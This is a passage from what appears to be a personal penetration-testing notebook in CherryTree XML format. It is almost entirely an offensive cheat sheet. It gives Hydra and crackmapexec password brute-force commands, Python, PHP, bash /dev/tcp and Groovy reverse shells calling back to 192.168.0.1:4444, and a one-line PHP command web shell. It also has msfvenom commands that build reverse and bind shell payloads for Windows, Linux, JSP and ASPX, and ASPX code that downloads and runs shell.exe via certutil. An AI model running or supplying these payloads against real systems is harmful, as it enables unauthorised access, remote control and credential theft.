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</encoded_png>
      </node>
    </node>
    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1687690629">
      <rich_text>

☐ </rich_text>
      <rich_text link="node 36">nmap</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 31">gobuster</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 33">nikto</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 37">FTP</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 34">smb</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 35">Active Directory</rich_text>
      <rich_text> 
☐ </rich_text>
      <rich_text link="node 32">ssh</rich_text>
      <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
        <rich_text> </rich_text>
        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
          <rich_text underline="single" scale="h1">Hydra</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.10.100 http-get /phpmyadmin/ -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra 10.10.10.100 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Post Request</rich_text>
          <rich_text>
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use </rich_text>
          <rich_text family="monospace">https-post-form</rich_text>
          <rich_text> instead of </rich_text>
          <rich_text family="monospace">http-post-form</rich_text>
          <rich_text> for HTTPS sites.

</rich_text>
          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.100 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">MYSQL</rich_text>
          <rich_text>
Change MYDATABASENAME. Default databasename is mysql.

</rich_text>
          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://10.10.10.100:3306/MYDATABASENAME -t 15</rich_text>
          <rich_text>

_______________________________</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>________


SSH



or if th</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>at doesnt work

</rich_text>
          <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.100</codebox>
          <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.100 -u patrick -p /usr/share/wordlists/rockyou.txt
</codebox>
        </node>
      </node>
      <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687691258">
        <rich_text>

☐ </rich_text>
        <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
        <rich_text>
☐ moz-extension://c8e8314e-8d2e-4f3a-9b40-37d10c56988b/index.html </rich_text>
        <node name="Catching Reverse Shells (Nc)" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Catching Reverse Shells (Netcat)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rlwrap enables the usage of arrow keys in your shell. </rich_text>
          <rich_text link="webs https://github.com/hanslub42/rlwrap">https://github.com/hanslub42/rlwrap</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">rlwrap nc -nlvp 4444</rich_text>
        </node>
        <node name="Python" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Python</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">As Command:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">Python Code:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">import</rich_text>
          <rich_text family="monospace"> socket,subprocess,os
s</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">socket.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">socket</rich_text>
          <rich_text family="monospace">(socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">AF_INET</rich_text>
          <rich_text family="monospace">,socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">SOCK_STREAM</rich_text>
          <rich_text family="monospace">)
s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">connect</rich_text>
          <rich_text family="monospace">(("192.168.0.1",</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">));os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">1</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">2</rich_text>
          <rich_text family="monospace">)
p</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">subprocess.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">call</rich_text>
          <rich_text family="monospace">(["/bin/sh","-i"])</rich_text>
        </node>
        <node name="PHP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text>PHP</rich_text>
          <node name="Kali Default PHP Reverse Shell" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-reverse-shell.php</rich_text>
          </node>
          <node name="Kali Default PHP CMD Shell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-backdoor.php</rich_text>
          </node>
          <node name="CMD Shell" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> system($_REQUEST["cmd"])</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace"> </rich_text>
            <rich_text family="monospace" foreground="#d73a49">?&gt;</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Call the CMD shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">http://192.168.0.1/cmd_shell.php</rich_text>
            <rich_text family="monospace" foreground="#d73a49">?</rich_text>
            <rich_text family="monospace">cmd=whoami</rich_text>
          </node>
          <node name="White WinterWolf Webshell" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">WhiteWinterWolf Webshell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text link="webs https://github.com/WhiteWinterWolf/wwwolf-php-webshell">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="PHP Reverse Shell" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 1</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 2</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php $sock=fsockopen("192.168.0.1", 4444)</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2 &gt;&amp; 3")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">As Command</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
          </node>
        </node>
        <node name="MSFVENOM" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <node name="Windows Binary (.exe)" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Windows Binary (.exe)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Output in Hex, C Style, Exclude bad chars, Exitfunction thread:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Meterpreter:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
          </node>
          <node name="Linux Binary (.elf)" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Linux Binary (.elf)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> bind_shell.elf</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
          </node>
          <node name="Java Server Pages (.jsp)" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Java Server Pages (.jsp)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> shell.jsp</rich_text>
          </node>
          <node name="Active Sever Pages Extended (.aspx)" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Active Sever Pages Extended (aspx)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx</rich_text>
          </node>
        </node>
        <node name="Active Sever Pages Extended (.apsx)" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text scale="h2">Active Sever Pages Extended (.aspx)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer A File (Certutil)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Execute a File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Jenkins / Groovy (Java)" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Jenkins / Groovy (Java)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Linux Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"/bin/sh";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
